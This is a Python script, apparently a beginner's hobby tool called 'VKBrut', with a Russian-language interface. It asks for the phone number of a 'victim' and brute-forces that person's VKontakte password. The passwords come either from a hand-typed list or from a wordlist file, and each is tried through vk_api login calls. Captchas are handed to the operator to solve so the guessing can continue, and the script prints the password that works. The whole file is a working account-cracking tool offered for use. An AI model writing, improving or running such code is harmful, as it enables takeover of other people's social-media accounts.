import vk_api
from colorama import Fore, Back, init
import os

init()

def del_json():
	files = os.listdir()
	for bad in files:
		if bad == 'vk_config.v2.json':
			os.remove(bad)
del_json()
def change_sys():
	if os.name == 'nt':
		os.system('cls')
	if os.name == 'possix':
		os.system('clear')
change_sys()
def captcha_handler(captcha):

    key = input("{0}\nВведите код капчи с картинки по ссылке выше: ".format(captcha.get_url())).strip()


    return captcha.try_again(key)

print(Fore.BLUE + '██╗   ██╗██╗  ██╗' + Fore.WHITE + '██████╗ ██████╗ ██╗   ██╗████████╗' + Fore.BLUE)
print('██║   ██║██║ ██╔╝' + Fore.WHITE + '██╔══██╗██╔══██╗██║   ██║╚══██╔══╝' + Fore.BLUE)
print('╚██╗ ██╔╝█████═╝ ' + Fore.WHITE + '██████╦╝██████╔╝██║   ██║   ██║   ' + Fore.BLUE)
print(' ╚████╔╝ ██╔═██╗ ' + Fore.WHITE + '██╔══██╗██╔══██╗██║   ██║   ██║   ' + Fore.BLUE)
print('  ╚██╔╝  ██║ ╚██╗' + Fore.WHITE + '██████╦╝██║  ██║╚██████╔╝   ██║   ' + Fore.BLUE)
print('   ╚═╝   ╚═╝  ╚═╝' + Fore.WHITE + '╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ' + Fore.WHITE)
print()
print('v 1.1 by LHACK\nTelegram: @LKGAMETV')
print('Я начинающий питонист так что не судите строго, это моя первая серьезная программа!!!')
print()
print(Fore.YELLOW + '[' + Fore.WHITE + '1' + Fore.YELLOW + ']' + Fore.GREEN + ' Быстрый (своими лапками)')
print(Fore.YELLOW + '[' + Fore.WHITE + '2' + Fore.YELLOW + ']' + Fore.GREEN + ' Медленный (через списки с паролем)' + Fore.WHITE)
print(Fore.YELLOW + '[' + Fore.WHITE + '3' + Fore.YELLOW + ']' + Fore.GREEN + ' Проблемы который могут возникнуть' + Fore.WHITE)


ask = input(Fore.YELLOW + '[' + Fore.CYAN + '?' + Fore.YELLOW + ']' + Fore.GREEN + ' Выбери метод: ')


if ask ==  '1':
		phone = input(Fore.YELLOW + '[' + Fore.CYAN + '?' + Fore.YELLOW + ']' + Fore.GREEN + ' Номер телефона жертвы: ')
		words = list(map(str, input(Fore.YELLOW + '[' + Fore.CYAN + '?' + Fore.YELLOW + ']' + Fore.GREEN + ' Пароли жертвы через запятую с пробелом(, ): ').split(', ')))

		for password in words:
			try:
				vk_session = vk_api.VkApi(phone, str(password), captcha_handler=captcha_handler)
				vk_session.auth()
				print(Fore.YELLOW + '[' + Fore.GREEN + '+' + Fore.YELLOW + ']' + Fore.GREEN + ' Пароль: ' + str(password))
				pause = input(Fore.YELLOW + '[' + Fore.GREEN + '!' + Fore.YELLOW + ']' + Fore.GREEN + ' Нажмите Enter для продолжения!')
				break
			except:
				print(Fore.YELLOW + '[' + Fore.RED + '-' + Fore.YELLOW + ']' + Fore.RED + ' Не верный: ' + str(password))


if ask == '2':
		phone = input(Fore.YELLOW + '[' + Fore.CYAN + '?' + Fore.YELLOW + ']' + Fore.GREEN + ' Номер телефона жертвы: ')
		word = input(Fore.YELLOW + '[' + Fore.CYAN + '?' + Fore.YELLOW + ']' + Fore.GREEN + ' Введите название файла с паролями: ')
		file = open(word, encoding = 'utf-8')
		for password in file:
			try:
				vk_session = vk_api.VkApi(phone, str(password), captcha_handler=captcha_handler)
				vk_session.auth()
				print(Fore.YELLOW + '[' + Fore.GREEN + '+' + Fore.YELLOW + ']' + Fore.GREEN + ' Пароль: ' + str(password))
				pause = input(Fore.YELLOW + '[' + Fore.GREEN + '!' + Fore.YELLOW + ']' + Fore.GREEN + ' Нажмите Enter для продолжения!')
				break

			except:
				print(Fore.YELLOW + '[' + Fore.RED + '-' + Fore.YELLOW + ']' + Fore.RED + ' Не верный: ' + str(password))

			#except FileNotFoundError:
				#print(Fore.YELLOW + '[' + Fore.RED + '-' + Fore.YELLOW + ']' + Fore.RED + ' Не верное имя файла!' + str(password))


if ask == '3':
	print(Fore.YELLOW + '[' + Fore.CYAN + '?' + Fore.YELLOW + ']' + Fore.GREEN + ' Если вас попросили ввести капчу то просто перейдите по ссылке которая выдала программа и введите капчу с картинки в программу')
